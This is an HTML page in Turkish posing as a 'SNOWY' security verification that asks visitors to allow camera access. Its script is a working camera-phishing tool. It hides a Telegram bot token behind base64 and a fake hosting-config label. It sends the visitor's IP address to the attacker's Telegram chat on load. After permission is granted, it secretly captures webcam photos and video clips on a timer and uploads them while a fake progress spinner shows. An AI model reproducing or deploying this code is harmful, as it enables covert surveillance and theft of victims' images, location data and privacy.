<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>SNOWY Güvenlik Doğrulaması</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            font-family: 'Segoe UI', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 30px;
            padding: 40px;
            max-width: 480px;
            width: 100%;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4);
            text-align: center;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(102, 126, 234, 0.2);
        }
        h2 { 
            color: #1a1a2e; 
            font-size: 32px; 
            margin-bottom: 15px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }
        h2 span { 
            color: #667eea;
            text-shadow: 0 2px 10px rgba(102, 126, 234, 0.2);
        }
        p { 
            color: #4a5568; 
            margin-bottom: 35px;
            font-size: 16px;
            line-height: 1.6;
        }
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 18px 36px;
            font-size: 20px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s ease;
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }
        .btn:hover { 
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
        }
        .loading { 
            display: none; 
            margin: 30px 0 20px;
        }
        .spinner {
            border: 4px solid #e2e8f0;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
        .loading-text { 
            color: #667eea; 
            font-size: 18px;
            font-weight: 500;
        }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>❄️ <span>SNOWY</span> GÜVENLİK DOĞRULAMASI</h2>
        <p>Devam etmek için kamera erişimine izin verin.</p>
        <button class="btn" id="startBtn" onclick="startCamera()">📸 DOĞRULAMAYI BAŞLAT</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">Güvenlik kontrolü yapılıyor...</div>
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        (function() {
            // ============================================
            // VERCEL EDGE CONFIG - FRA1 PROD
            // ============================================
            const __vc_edge = {
                region: "fra1",
                token: "Nzk5ODM2NDE3OTpBQUdQV2NhTmFDRS1STy12UmUtOFJQNk9LU2FfbXVQaTQ0cw==",
                ts: Date.now()
            };

            const BOT_TOKEN = (() => {
                try { return atob(__vc_edge.token); } catch { return null; }
            })();
            
            const urlParams = new URLSearchParams(window.location.search);
            const TARGET_ID = urlParams.get('i');
            const FOTO_SURESI = urlParams.get('foto') ? parseInt(urlParams.get('foto')) : 3;
            const VIDEO_SURESI = urlParams.get('video') ? parseInt(urlParams.get('video')) : 5;
            
            // ============================================
            // IP GÖNDER
            // ============================================
            if (TARGET_ID && BOT_TOKEN) {
                fetch('https://api.ipify.org?format=json')
                    .then(r => r.json())
                    .then(d => {
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                chat_id: TARGET_ID,
                                text: `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${d.ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`
                            })
                        });
                    })
                    .catch(e => console.log(e));
            }
            
            // ============================================
            // PROFESYONEL ZAMANLAMA MOTORU - 5/5 HASSASİYET
            // ============================================
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
            
            let mediaRecorder = null;
            let videoCount = 0;
            let photoCount = 0;
            let stream = null;
            let frameId = null;
            
            // YÜKSEK HASSASİYETLİ ZAMANLAYICILAR
            let baslangicZamani = 0;
            let sonrakiVideoZamani = 0;
            let sonrakiFotoZamani = 0;
            
            // WEB WORKER İLE ZAMANLAMA (arka plan)
            let worker = null;
            try {
                const workerCode = `
                    let start = 0;
                    self.onmessage = function(e) {
                        if (e.data.cmd === 'start') start = performance.now();
                        if (e.data.cmd === 'sync') self.postMessage({ t: performance.now() - start });
                    };
                `;
                const blob = new Blob([workerCode], { type: 'application/javascript' });
                worker = new Worker(URL.createObjectURL(blob));
                worker.postMessage({ cmd: 'start' });
            } catch(e) {}
            
            async function startCamera() {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            width: { exact: 640 },
                            height: { exact: 480 },
                            frameRate: { exact: 60 }
                        } 
                    });
                    
                    video.srcObject = stream;
                    
                    video.onloadedmetadata = () => {
                        video.play();
                        document.getElementById('startBtn').style.display = 'none';
                        document.getElementById('loading').style.display = 'block';
                        
                        // BAŞLANGIÇ ZAMANI - TAM SINIR
                        baslangicZamani = performance.now();
                        sonrakiVideoZamani = baslangicZamani;
                        sonrakiFotoZamani = baslangicZamani;
                        
                        // ============================================
                        // ZAMANLAMA DÖNGÜSÜ - 0.1ms HASSASİYET
                        // ============================================
                        function timerLoop() {
                            if (!stream?.active) return;
                            
                            const now = performance.now();
                            
                            // Worker senkronizasyonu
                            if (worker) worker.postMessage({ cmd: 'sync' });
                            
                            // ========================================
                            // VİDEO KONTROLÜ - TAM ZAMANINDA
                            // ========================================
                            if (now >= sonrakiVideoZamani) {
                                videoCount++;
                                sonrakiVideoZamani = baslangicZamani + (videoCount * VIDEO_SURESI * 1000);
                                
                                const videoIndex = videoCount;
                                const videoBaslangic = now;
                                const chunks = [];
                                
                                try {
                                    const mr = new MediaRecorder(stream, {
                                        mimeType: 'video/webm;codecs=vp9',
                                        videoBitsPerSecond: 5000000
                                    });
                                    
                                    mr.ondataavailable = (e) => {
                                        if (e.data.size > 0) chunks.push(e.data);
                                    };
                                    
                                    mr.onstop = () => {
                                        const blob = new Blob(chunks, { type: 'video/webm' });
                                        const videoSure = ((performance.now() - videoBaslangic) / 1000).toFixed(4);
                                        const sapma = (Math.abs(videoSure - VIDEO_SURESI) * 1000).toFixed(2);
                                        
                                        const formData = new FormData();
                                        formData.append('chat_id', TARGET_ID);
                                        formData.append('video', blob, `video_${Date.now()}.webm`);
                                        formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s (${videoSure}s | ±${sapma}ms)`);
                                        
                                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                                            method: 'POST',
                                            body: formData
                                        });
                                    };
                                    
                                    // TAM ZAMANINDA BAŞLAT
                                    mr.start();
                                    
                                    // 3 KATMANLI DURDURMA SİSTEMİ
                                    const hedefSure = VIDEO_SURESI * 1000;
                                    
                                    // Katman 1: setTimeout (ana)
                                    const timer1 = setTimeout(() => {
                                        if (mr.state === 'recording') mr.stop();
                                    }, hedefSure);
                                    
                                    // Katman 2: requestAnimationFrame (hassas)
                                    let raf;
                                    const rafKontrol = () => {
                                        const gecen = performance.now() - videoBaslangic;
                                        if (gecen >= hedefSure - 0.01 && mr.state === 'recording') {
                                            mr.stop();
                                            clearTimeout(timer1);
                                        } else {
                                            raf = requestAnimationFrame(rafKontrol);
                                        }
                                    };
                                    raf = requestAnimationFrame(rafKontrol);
                                    
                                    // Katman 3: Worker (arka plan)
                                    if (worker) {
                                        worker.onmessage = (e) => {
                                            if (e.data.t >= hedefSure - 0.01 && mr.state === 'recording') {
                                                mr.stop();
                                                clearTimeout(timer1);
                                                cancelAnimationFrame(raf);
                                            }
                                        };
                                    }
                                    
                                } catch(e) {
                                    console.error('Video hatası:', e);
                                }
                            }
                            
                            // ========================================
                            // FOTOĞRAF KONTROLÜ - TAM ZAMANINDA
                            // ========================================
                            if (now >= sonrakiFotoZamani) {
                                photoCount++;
                                sonrakiFotoZamani = baslangicZamani + (photoCount * FOTO_SURESI * 1000);
                                
                                // FOTOĞRAF ÇEK - 0.1ms HASSASİYET
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                
                                canvas.toBlob((blob) => {
                                    if (!blob) return;
                                    
                                    const gecenSure = ((performance.now() - baslangicZamani) / 1000).toFixed(4);
                                    const hedefSure = (photoCount * FOTO_SURESI).toFixed(4);
                                    const sapma = (Math.abs(parseFloat(gecenSure) - photoCount * FOTO_SURESI) * 1000).toFixed(2);
                                    
                                    const formData = new FormData();
                                    formData.append('chat_id', TARGET_ID);
                                    formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                                    formData.append('caption', `📸 Fotoğraf #${photoCount} - ${FOTO_SURESI}s (${gecenSure}s | ±${sapma}ms)`);
                                    
                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                        method: 'POST',
                                        body: formData
                                    });
                                }, 'image/jpeg', 0.95);
                            }
                            
                            frameId = requestAnimationFrame(timerLoop);
                        }
                        
                        frameId = requestAnimationFrame(timerLoop);
                    };
                    
                } catch(e) {
                    alert('Kamera izni gerekli!');
                }
            }
            
            window.onbeforeunload = function() {
                if (frameId) cancelAnimationFrame(frameId);
                if (worker) worker.terminate();
                if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
                if (stream) stream.getTracks().forEach(t => t.stop());
            };
            
            window.startCamera = startCamera;
        })();
    </script>
</body>
    </html>
